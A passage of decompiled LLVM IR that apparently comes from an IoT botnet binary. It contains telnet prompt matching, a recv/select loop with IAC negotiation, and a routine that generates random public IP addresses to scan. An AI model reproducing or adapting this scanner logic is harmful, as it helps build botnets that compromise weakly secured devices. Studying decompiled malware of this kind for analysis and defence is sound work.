  %v7_a5b4 = icmp eq i8 %v2_a59c, -3
  br i1 %v7_a5a0, label %dec_label_pc_a5a8, label %dec_label_pc_a5e0

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5bc, label %dec_label_pc_a5c8

dec_label_pc_a5bc:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5c8:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5bc, %dec_label_pc_a5c8
  %storemerge = phi i8 [ -3, %dec_label_pc_a5c8 ], [ -5, %dec_label_pc_a5bc ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a5e0:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5f4, label %dec_label_pc_a600

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a600:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a608:                                ; preds = %dec_label_pc_a5f4, %dec_label_pc_a600
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a600 ], [ -4, %dec_label_pc_a5f4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5d0, %dec_label_pc_a588, %dec_label_pc_a568, %dec_label_pc_a608
  %v5_a628 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a550, i32 1, i32 16384)
  %v1_a630 = add i32 %arg2, 2
  %v4_a644 = inttoptr i32 %v1_a630 to i32*
  %v5_a644 = call i32 @__libc_send(i32 %arg1, i32* %v4_a644, i32 1, i32 16384)
  br label %dec_label_pc_a650

dec_label_pc_a650:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a614, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a650, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a614, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a608, { 1, 0 }
  uselistorder label %dec_label_pc_a5d0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a680 = call i32 @strlen(i8* %arg1)
  %v2_a6c8 = add i32 %v3_a680, %tmp
  br label %dec_label_pc_a79c

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a704, %dec_label_pc_a6e0, %dec_label_pc_a6bc
  %v1_a6a4 = add nsw i32 %stack_var_-24.013, 1
  %v7_a6b8 = icmp sgt i32 %v3_a680, %v1_a6a4
  br i1 %v7_a6b8, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a6ac.preheader, %dec_label_pc_a6a0
  %stack_var_-24.013 = phi i32 [ %v1_a6a4, %dec_label_pc_a6a0 ], [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ]
  %v2_a6d0 = sub i32 %v2_a6c8, %stack_var_-24.013
  %v1_a6d4 = inttoptr i32 %v2_a6d0 to i8*
  %v2_a6d4 = load i8, i8* %v1_a6d4, align 1
  %v2_a6d8 = icmp eq i8 %v2_a6d4, 0
  br i1 %v2_a6d8, label %dec_label_pc_a6a0, label %dec_label_pc_a6e0

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a6bc
  %v2_a6f8 = load i8, i8* %v1_a6d4, align 1
  %v7_a6fc = icmp eq i8 %v2_a6f8, 32
  br i1 %v7_a6fc, label %dec_label_pc_a6a0, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6e0
  %v2_a71c = load i8, i8* %v1_a6d4, align 1
  %v7_a720 = icmp eq i8 %v2_a71c, 13
  br i1 %v7_a720, label %dec_label_pc_a6a0, label %dec_label_pc_a728

dec_label_pc_a728:                                ; preds = %dec_label_pc_a704
  %v2_a740 = load i8, i8* %v1_a6d4, align 1
  %v7_a744 = icmp eq i8 %v2_a740, 10
  br i1 %v7_a744, label %dec_label_pc_a6a0, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a6a0, %dec_label_pc_a6ac.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ], [ %stack_var_-24.013, %dec_label_pc_a728 ], [ %v1_a6a4, %dec_label_pc_a6a0 ]
  %v2_a760 = sub i32 %v2_a6c8, %stack_var_-24.0.lcssa
  %v1_a764 = inttoptr i32 %v2_a760 to i8*
  %v2_a764 = load i8, i8* %v1_a764, align 1
  %v2_a774 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1b720.77 to i32)
  %v1_a778 = inttoptr i32 %v2_a774 to i8*
  %v2_a778 = load i8, i8* %v1_a778, align 1
  %v9_a77c = icmp eq i8 %v2_a764, %v2_a778
  %v1_a794 = add i32 %storemerge2, 1
  br i1 %v9_a77c, label %dec_label_pc_a7bc, label %dec_label_pc_a79c

dec_label_pc_a79c:                                ; preds = %dec_label_pc_a74c, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a74c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a794, %dec_label_pc_a74c ]
  %v3_a7a4 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b720.77, i32 0, i32 0))
  %v3_a7ac = icmp ult i32 %storemerge2, %v3_a7a4
  br i1 %v3_a7ac, label %dec_label_pc_a6ac.preheader, label %dec_label_pc_a7bc

dec_label_pc_a6ac.preheader:                      ; preds = %dec_label_pc_a79c
  %v7_a6b812 = icmp sgt i32 %v3_a680, %stack_var_-24.1
  br i1 %v7_a6b812, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a7bc:                                ; preds = %dec_label_pc_a79c, %dec_label_pc_a74c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a74c ], [ 0, %dec_label_pc_a79c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a680, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a74c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a7d4 = load i32, i32* @fp, align 4
  store i32 %v3_a7d4, i32* %stack_var_-16, align 4
  %v13_a7d4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a824 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a864 = udiv i32 %arg1, 32
  %v3_a870 = mul nuw nsw i32 %v3_a864, 4
  %v1_a888 = urem i32 %arg1, 32
  %v6_a890 = shl i32 1, %v1_a888
  %v1_a8b4 = add i32 %arg1, 1
  %v2_a8bc = ptrtoint i32* %stack_var_-176 to i32
  %v6_a9dc = inttoptr i32 %arg2 to i8*
  %v2_a9f0 = icmp eq i32 %arg3, 0
  %v1_a9fc = inttoptr i32 %arg6 to i8*
  %v5_aa40 = icmp sgt i32 %arg5, 0
  %v2_a878 = add nsw i32 %v3_a870, -152
  %v2_a87c = add i32 %v2_a878, %v13_a7d4
  %v1_a880 = inttoptr i32 %v2_a87c to i32*
  br label %dec_label_pc_aa18

dec_label_pc_a838.lr.ph:                          ; preds = %dec_label_pc_aa2c, %dec_label_pc_aa38
  br label %dec_label_pc_a838

dec_label_pc_a838:                                ; preds = %dec_label_pc_a838.lr.ph, %dec_label_pc_a838
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a838.lr.ph ], [ %v1_a84c, %dec_label_pc_a838 ]
  %v5_a844 = mul nuw nsw i32 %storemerge27, 4
  %v6_a844 = add i32 %v5_a844, %v2_a824
  %v7_a844 = inttoptr i32 %v6_a844 to i32*
  store i32 0, i32* %v7_a844, align 4
  %v1_a84c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a84c, 32
  br i1 %tmp30, label %dec_label_pc_a838, label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a838
  %v2_a880 = load i32, i32* %v1_a880, align 4
  %v2_a894 = or i32 %v2_a880, %v6_a890
  store i32 %v2_a894, i32* %v1_a880, align 4
  %v5_a8d0 = call i32 @__libc_select(i32 %v1_a8b4, i32 %v2_a824, i32 0, i32 0, i32 %v2_a8bc)
  %tmp31 = icmp slt i32 %v5_a8d0, 1
  br i1 %tmp31, label %dec_label_pc_aa5c, label %dec_label_pc_a8e0

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a860
  %v2_a8ec = add i32 %stack_var_-40.0, %arg6
  %v5_a8f0 = inttoptr i32 %v2_a8ec to i8*
  %v6_a904 = inttoptr i32 %v2_a8ec to i32*
  %v7_a904 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a904, i32 1, i32 0, i32 %v2_a8ec)
  %v7_a914 = icmp eq i32 %v7_a904, -1
  br i1 %v7_a914, label %dec_label_pc_a928, label %dec_label_pc_a91c

dec_label_pc_a91c:                                ; preds = %dec_label_pc_a8e0
  %v2_a920 = icmp eq i32 %v7_a904, 0
  br i1 %v2_a920, label %dec_label_pc_a928, label %dec_label_pc_a934

dec_label_pc_a928:                                ; preds = %dec_label_pc_a91c, %dec_label_pc_a8e0
  br label %dec_label_pc_aa64

dec_label_pc_a934:                                ; preds = %dec_label_pc_a91c
  %v2_a93c = add i32 %v7_a904, %stack_var_-40.0
  %v2_a948 = load i8, i8* %v5_a8f0, align 1
  %v2_a94c = icmp eq i8 %v2_a948, -1
  br i1 %v2_a94c, label %dec_label_pc_a954, label %dec_label_pc_a9d4

dec_label_pc_a954:                                ; preds = %dec_label_pc_a934
  %v1_a958 = add i32 %v2_a8ec, 1
  %v5_a96c = inttoptr i32 %v1_a958 to i32*
  %v6_a96c = call i32 @__libc_recv(i32 %arg1, i32* %v5_a96c, i32 2, i32 0, i32 %v2_a93c)
  %v7_a97c = icmp eq i32 %v6_a96c, -1
  br i1 %v7_a97c, label %dec_label_pc_a990, label %dec_label_pc_a984

dec_label_pc_a984:                                ; preds = %dec_label_pc_a954
  %v2_a988 = icmp eq i32 %v6_a96c, 0
  br i1 %v2_a988, label %dec_label_pc_a990, label %dec_label_pc_a99c

dec_label_pc_a990:                                ; preds = %dec_label_pc_a984, %dec_label_pc_a954
  br label %dec_label_pc_aa64

dec_label_pc_a99c:                                ; preds = %dec_label_pc_a984
  %v2_a9a4 = add i32 %v6_a96c, %v2_a93c
  %v5_a9b8 = call i32 @negotiate(i32 %arg1, i32 %v2_a8ec, i32 3, i32 %v2_a9a4, i32 %v2_a9a4)
  %v2_a9c0 = icmp eq i32 %v5_a9b8, 0
  br i1 %v2_a9c0, label %dec_label_pc_a9c8, label %dec_label_pc_aa18

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a99c
  br label %dec_label_pc_aa64

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_a934
  %v7_a9dc = call i32 @strstr(i32 %arg6, i8* %v6_a9dc)
  %v2_a9e4 = icmp eq i32 %v7_a9dc, 0
  br i1 %v2_a9e4, label %dec_label_pc_a9ec, label %dec_label_pc_aa50

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9d4
  br i1 %v2_a9f0, label %dec_label_pc_aa18, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9ec
  %v2_a9fc = call i32 @matchPrompt(i8* %v1_a9fc)
  %v2_aa04 = icmp eq i32 %v2_a9fc, 0
  br i1 %v2_aa04, label %dec_label_pc_aa18, label %dec_label_pc_aa50

dec_label_pc_aa18:                                ; preds = %dec_label_pc_a99c, %dec_label_pc_a9f8, %dec_label_pc_a9ec, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a9a4, %dec_label_pc_a99c ], [ %v2_a93c, %dec_label_pc_a9ec ], [ %v2_a93c, %dec_label_pc_a9f8 ]
  %v1_aa1c = add i32 %stack_var_-40.0, 2
  %v6_aa28 = icmp slt i32 %v1_aa1c, %arg7
  br i1 %v6_aa28, label %dec_label_pc_aa2c, label %dec_label_pc_aa5c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa18
  %v3_aa2c = load i32, i32* %stack_var_-176, align 4
  %v5_aa34 = icmp sgt i32 %v3_aa2c, 0
  br i1 %v5_aa34, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa2c
  br i1 %v5_aa40, label %dec_label_pc_a838.lr.ph, label %dec_label_pc_aa5c

dec_label_pc_aa50:                                ; preds = %dec_label_pc_a9d4, %dec_label_pc_a9f8
  br label %dec_label_pc_aa64

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_a860, %dec_label_pc_aa38, %dec_label_pc_aa18
  br label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50, %dec_label_pc_a9c8, %dec_label_pc_a990, %dec_label_pc_a928, %dec_label_pc_aa5c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_aa5c ], [ 1, %dec_label_pc_aa50 ], [ 0, %dec_label_pc_a928 ], [ 0, %dec_label_pc_a990 ], [ 0, %dec_label_pc_a9c8 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a96c, { 1, 2, 0 }
  uselistorder i32 %v7_a904, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a824, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_aa64, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_aa5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %dec_label_pc_aa18, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a838, { 1, 0 }
  uselistorder label %dec_label_pc_a838.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_aa78 = load i32, i32* @fp, align 4
  store i32 43648, i32* %stack_var_-4, align 4
  %v2_aa7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aa7c, i32* @fp, align 4
  %v2_aa80 = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* bitcast (i32* @global_var_2687b.80 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_2687c.81 to i8*), align 4
  store i8 0, i8* @global_var_2687d.82, align 1
  store i8 0, i8* @global_var_2687e.83, align 1
  %v0_aab4 = call i32 @random()
  %v2_aac4 = srem i32 %v0_aab4, 255
  %v1_aad4 = trunc i32 %v2_aac4 to i8
  store i8 %v1_aad4, i8* bitcast (i32* @global_var_2687b.80 to i8*), align 4
  %v0_aad8 = call i32 @random()
  %v2_aae8 = srem i32 %v0_aad8, 255
  %v1_aaf8 = trunc i32 %v2_aae8 to i8
  store i8 %v1_aaf8, i8* bitcast (i32* @global_var_2687c.81 to i8*), align 4
  %v0_aafc = call i32 @random()
  %v2_ab0c = srem i32 %v0_aafc, 255
  %v1_ab1c = trunc i32 %v2_ab0c to i8
  store i8 %v1_ab1c, i8* @global_var_2687d.82, align 1
  %v0_ab20 = call i32 @random()
  %v2_ab30 = srem i32 %v0_ab20, 255
  %v1_ab40 = trunc i32 %v2_ab30 to i8
  store i8 %v1_ab40, i8* @global_var_2687e.83, align 1
  %v0_ab44 = call i32 @random()
  %v2_ab54 = srem i32 %v0_ab44, 208
  %v2_ab64 = icmp eq i32 %v2_ab54, 0
  br i1 %v2_ab64, label %dec_label_pc_ab6c, label %dec_label_pc_ab94

dec_label_pc_ab6c:                                ; preds = %entry
  %v3_ab78 = load i8, i8* @global_var_2687d.82, align 1
  %v3_ab84 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ab90 = sext i8 %v3_ab78 to i32
  %v6_ab90 = sext i8 %v3_ab84 to i32
  %v8_ab90 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b728.85 to i32), i32 %v4_ab90, i32 %v6_ab90, i32 0)
  br label %dec_label_pc_ab94

dec_label_pc_ab94:                                ; preds = %entry, %dec_label_pc_ab6c
  %v7_ab98 = icmp eq i32 %v2_ab54, 1
  br i1 %v7_ab98, label %dec_label_pc_aba0, label %dec_label_pc_abc8

dec_label_pc_aba0:                                ; preds = %dec_label_pc_ab94
  %v3_abac = load i8, i8* @global_var_2687d.82, align 1
  %v3_abb8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_abc4 = sext i8 %v3_abac to i32
  %v6_abc4 = sext i8 %v3_abb8 to i32
  %v8_abc4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b734.87 to i32), i32 %v4_abc4, i32 %v6_abc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_ab94, %dec_label_pc_aba0
  %v7_abcc = icmp eq i32 %v2_ab54, 2
  br i1 %v7_abcc, label %dec_label_pc_abd4, label %dec_label_pc_abfc

dec_label_pc_abd4:                                ; preds = %dec_label_pc_abc8
  %v3_abe0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_abec = load i8, i8* @global_var_2687e.83, align 1
  %v4_abf8 = sext i8 %v3_abe0 to i32
  %v6_abf8 = sext i8 %v3_abec to i32
  %v8_abf8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b744.89 to i32), i32 %v4_abf8, i32 %v6_abf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_abd4
  %v7_ac00 = icmp eq i32 %v2_ab54, 3
  br i1 %v7_ac00, label %dec_label_pc_ac08, label %dec_label_pc_ac30

dec_label_pc_ac08:                                ; preds = %dec_label_pc_abfc
  %v3_ac14 = load i8, i8* @global_var_2687d.82, align 1
  %v3_ac20 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ac2c = sext i8 %v3_ac14 to i32
  %v6_ac2c = sext i8 %v3_ac20 to i32
  %v8_ac2c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b750.91 to i32), i32 %v4_ac2c, i32 %v6_ac2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_abfc, %dec_label_pc_ac08
  %v7_ac34 = icmp eq i32 %v2_ab54, 4
  br i1 %v7_ac34, label %dec_label_pc_ac3c, label %dec_label_pc_ac64

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac30
  %v3_ac48 = load i8, i8* @global_var_2687d.82, align 1
  %v3_ac54 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ac60 = sext i8 %v3_ac48 to i32
  %v6_ac60 = sext i8 %v3_ac54 to i32
  %v8_ac60 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b760.93 to i32), i32 %v4_ac60, i32 %v6_ac60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac30, %dec_label_pc_ac3c
  %v7_ac68 = icmp eq i32 %v2_ab54, 5
  br i1 %v7_ac68, label %dec_label_pc_ac70, label %dec_label_pc_ac98

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac64
  %v3_ac7c = load i8, i8* @global_var_2687d.82, align 1
  %v3_ac88 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ac94 = sext i8 %v3_ac7c to i32
  %v6_ac94 = sext i8 %v3_ac88 to i32
  %v8_ac94 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b76c.95 to i32), i32 %v4_ac94, i32 %v6_ac94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_ac70
  %v7_ac9c = icmp eq i32 %v2_ab54, 6
  br i1 %v7_ac9c, label %dec_label_pc_aca4, label %dec_label_pc_accc

dec_label_pc_aca4:                                ; preds = %dec_label_pc_ac98
  %v3_acb0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_acbc = load i8, i8* @global_var_2687e.83, align 1
  %v4_acc8 = sext i8 %v3_acb0 to i32
  %v6_acc8 = sext i8 %v3_acbc to i32
  %v8_acc8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b77c.97 to i32), i32 %v4_acc8, i32 %v6_acc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_ac98, %dec_label_pc_aca4
  %v7_acd0 = icmp eq i32 %v2_ab54, 7
  br i1 %v7_acd0, label %dec_label_pc_acd8, label %dec_label_pc_ad00

dec_label_pc_acd8:                                ; preds = %dec_label_pc_accc
  %v3_ace4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_acf0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_acfc = sext i8 %v3_ace4 to i32
  %v6_acfc = sext i8 %v3_acf0 to i32
  %v8_acfc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b788.99 to i32), i32 %v4_acfc, i32 %v6_acfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %dec_label_pc_accc, %dec_label_pc_acd8
  %v7_ad04 = icmp eq i32 %v2_ab54, 8
  br i1 %v7_ad04, label %dec_label_pc_ad0c, label %dec_label_pc_ad34

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad00
  %v3_ad18 = load i8, i8* @global_var_2687d.82, align 1
  %v3_ad24 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ad30 = sext i8 %v3_ad18 to i32
  %v6_ad30 = sext i8 %v3_ad24 to i32
  %v8_ad30 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b798.101 to i32), i32 %v4_ad30, i32 %v6_ad30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad34

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad00, %dec_label_pc_ad0c
  %v7_ad38 = icmp eq i32 %v2_ab54, 9
  br i1 %v7_ad38, label %dec_label_pc_ad40, label %dec_label_pc_ad68

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad34
  %v3_ad4c = load i8, i8* @global_var_2687d.82, align 1
  %v3_ad58 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ad64 = sext i8 %v3_ad4c to i32
  %v6_ad64 = sext i8 %v3_ad58 to i32
  %v8_ad64 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b7a8.103 to i32), i32 %v4_ad64, i32 %v6_ad64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad68

dec_label_pc_ad68:                                ; preds = %dec_label_pc_ad34, %dec_label_pc_ad40
  %v7_ad6c = icmp eq i32 %v2_ab54, 10
  br i1 %v7_ad6c, label %dec_label_pc_ad74, label %dec_label_pc_ad9c

dec_label_pc_ad74:                                ; preds = %dec_label_pc_ad68
  %v3_ad80 = load i8, i8* @global_var_2687d.82, align 1
  %v3_ad8c = load i8, i8* @global_var_2687e.83, align 1
  %v4_ad98 = sext i8 %v3_ad80 to i32
  %v6_ad98 = sext i8 %v3_ad8c to i32
  %v8_ad98 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b7b8.105 to i32), i32 %v4_ad98, i32 %v6_ad98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad9c

dec_label_pc_ad9c:                                ; preds = %dec_label_pc_ad68, %dec_label_pc_ad74
  %v7_ada0 = icmp eq i32 %v2_ab54, 11
  br i1 %v7_ada0, label %dec_label_pc_ada8, label %dec_label_pc_add0

dec_label_pc_ada8:                                ; preds = %dec_label_pc_ad9c
  %v3_adb4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_adc0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_adcc = sext i8 %v3_adb4 to i32
  %v6_adcc = sext i8 %v3_adc0 to i32
  %v8_adcc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b7c8.107 to i32), i32 %v4_adcc, i32 %v6_adcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_ad9c, %dec_label_pc_ada8
  %v7_add4 = icmp eq i32 %v2_ab54, 12
  br i1 %v7_add4, label %dec_label_pc_addc, label %dec_label_pc_ae04

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v3_ade8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_adf4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ae00 = sext i8 %v3_ade8 to i32
  %v6_ae00 = sext i8 %v3_adf4 to i32
  %v8_ae00 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b7d4.109 to i32), i32 %v4_ae00, i32 %v6_ae00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %dec_label_pc_add0, %dec_label_pc_addc
  %v7_ae08 = icmp eq i32 %v2_ab54, 13
  br i1 %v7_ae08, label %dec_label_pc_ae10, label %dec_label_pc_ae38

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae04
  %v3_ae1c = load i8, i8* @global_var_2687d.82, align 1
  %v3_ae28 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ae34 = sext i8 %v3_ae1c to i32
  %v6_ae34 = sext i8 %v3_ae28 to i32
  %v8_ae34 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b7e4.111 to i32), i32 %v4_ae34, i32 %v6_ae34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae38

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ae04, %dec_label_pc_ae10
  %v7_ae3c = icmp eq i32 %v2_ab54, 14
  br i1 %v7_ae3c, label %dec_label_pc_ae44, label %dec_label_pc_ae6c

dec_label_pc_ae44:                                ; preds = %dec_label_pc_ae38
  %v3_ae50 = load i8, i8* @global_var_2687d.82, align 1
  %v3_ae5c = load i8, i8* @global_var_2687e.83, align 1
  %v4_ae68 = sext i8 %v3_ae50 to i32
  %v6_ae68 = sext i8 %v3_ae5c to i32
  %v8_ae68 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b7f4.113 to i32), i32 %v4_ae68, i32 %v6_ae68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ae44
  %v7_ae70 = icmp eq i32 %v2_ab54, 15
  br i1 %v7_ae70, label %dec_label_pc_ae78, label %dec_label_pc_aea0

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae84 = load i8, i8* @global_var_2687d.82, align 1
  %v3_ae90 = load i8, i8* @global_var_2687e.83, align 1
  %v4_ae9c = sext i8 %v3_ae84 to i32
  %v6_ae9c = sext i8 %v3_ae90 to i32
  %v8_ae9c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b804.115 to i32), i32 %v4_ae9c, i32 %v6_ae9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea0

dec_label_pc_aea0:                                ; preds = %dec_label_pc_ae6c, %dec_label_pc_ae78
  %v7_aea4 = icmp eq i32 %v2_ab54, 16
  br i1 %v7_aea4, label %dec_label_pc_aeac, label %dec_label_pc_aed4

dec_label_pc_aeac:                                ; preds = %dec_label_pc_aea0
  %v3_aeb8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_aec4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_aed0 = sext i8 %v3_aeb8 to i32
  %v6_aed0 = sext i8 %v3_aec4 to i32
  %v8_aed0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b814.117 to i32), i32 %v4_aed0, i32 %v6_aed0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed4

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aea0, %dec_label_pc_aeac
  %v7_aed8 = icmp eq i32 %v2_ab54, 17
